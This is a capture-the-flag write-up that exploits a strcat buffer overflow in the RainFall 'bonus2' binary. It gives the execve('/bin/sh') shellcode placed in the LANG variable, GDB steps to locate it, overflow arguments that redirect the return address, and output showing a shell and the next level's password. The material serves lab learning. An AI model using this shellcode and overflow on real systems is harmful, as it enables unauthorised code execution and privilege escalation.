# RainFall bonus2 - ret2env Exploit Guide

## Context

This is a buffer overflow exploitation guide for the bonus2 challenge from the RainFall project. The objective is to exploit a `strcat` vulnerability to execute shellcode placed in an environment variable.

**Prerequisites:**
- Lab/CTF environment only
- Architecture: i386
- Protections: NX off, PIE off, ASLR off (stable addresses)

## Overview

The vulnerability exists in the `strcat` operation within the `greetuser` function:
- `main` reads `argv[1]` (40 bytes) and `argv[2]` (32 bytes) into separate buffers
- These are copied to a 76-byte zone that `greetuser` reads via `&stack0x00000004` (ebp+8)
- `greetuser` writes a greeting to destination `&local_4c` then calls `strcat(dest, src)`
- We overflow the destination to overwrite the return address with a pointer to shellcode in the `LANG` environment variable

## Memory Layout Analysis

### Stack Layout in greetuser
```
&local_4c (dest)  [4 bytes]
local_48          [4 bytes]
local_44          [64 bytes]
saved EBP         [4 bytes]
RET               [4 bytes]  ← Target
```

**Distance from dest to RET = 76 bytes**

### Why 23 bytes of padding?

1. **Greeting offset**: In Dutch mode, greeting is "Goedemiddag! " (13 bytes)
2. **strcat starts writing after greeting**: dest + 13
3. **Offset to reach RET**: 76 - 13 = 63 bytes from source start
4. **argv1 takes first 40 bytes** of source (argv1 || argv2)
5. **Target position in argv2**: 63 - 40 = 23

```
DEST: "Goedemiddag! " + (strcat from SRC)
SRC:  [ argv1 (40) ][ argv2 ... ]
                      ^
                      argv2[23] = 1st byte of address (little-endian)
```

## Step-by-Step Exploitation

### 1. Prepare Shellcode in LANG Environment Variable

```bash
export LANG=$(python -c 'print "nl" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*50')
```

**Components:**
- `"nl"`: Forces Dutch branch (13-byte greeting)
- `"\x90"*100`: NOP sled (landing zone)
- Shellcode: execve("/bin/sh") without null bytes
- `"\x90"*50`: Additional NOPs

### 2. Find LANG Address in Memory

Using GDB to find the environment variable address:

```bash
gdb ./bonus2
(gdb) b *0x080485a6          # Break after getenv call
(gdb) run AAAA BBBB
(gdb) ni                     # Step to return from getenv
(gdb) p/x $eax               # EAX contains LANG address
$1 = 0xbffffe8b              # Example address
(gdb) p/x $eax+0x42          # Target = LANG_ADDR + 2 + 64
$2 = 0xbffffecd              # Example target
(gdb) quit
```

**Target calculation**: `LANG_ADDR + 2 + 64`
- `+2`: Skip "nl" prefix
- `+64`: Land in middle of NOP sled

### 3. Convert Address to Little-Endian

For target address `0xbffffecd`, the bytes are: `\xCD\xFE\xFF\xBF`

### 4. Construct Exploit Arguments

```bash
ARG1=$(python -c 'print "A"*40')
ARG2=$(python -c 'print "B"*23 + "\xCD\xFE\xFF\xBF"')
```

**Structure:**
- `ARG1`: 40 bytes of padding (fills argv1 slot)
- `ARG2`: 23 bytes padding + 4-byte target address

### 5. Execute Exploit

```bash
./bonus2 "$ARG1" "$ARG2"
```

Expected output:
```
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Troubleshooting

### Segmentation Fault
- **Wrong address**: Re-measure LANG address in GDB after setting environment
- **NOP sled miss**: Adjust offset (try +0x3A or +0x4A instead of +0x42)
- **Endianness error**: Verify little-endian byte order

### Wrong Greeting Language
- Ensure LANG starts with "nl" to trigger Dutch greeting
- Check that greeting length is exactly 13 bytes

### General Issues
- Verify protections are disabled (NX/PIE/ASLR)
- Confirm argv1 is exactly 40 bytes
- Ensure target address starts at argv2[23]

## Technical Summary

- **Buffer overflow**: `strcat` in `greetuser` function
- **Target**: Return address at offset 76 from destination buffer
- **Payload structure**: 13-byte greeting + 40-byte argv1 + 23-byte padding + 4-byte address
- **Shellcode location**: LANG environment variable with NOP sled
- **Technique**: ret2env (return to environment variable)

## Security Note

This exploit only works in controlled environments with disabled security protections. Modern systems with NX, ASLR, and stack canaries would prevent this attack.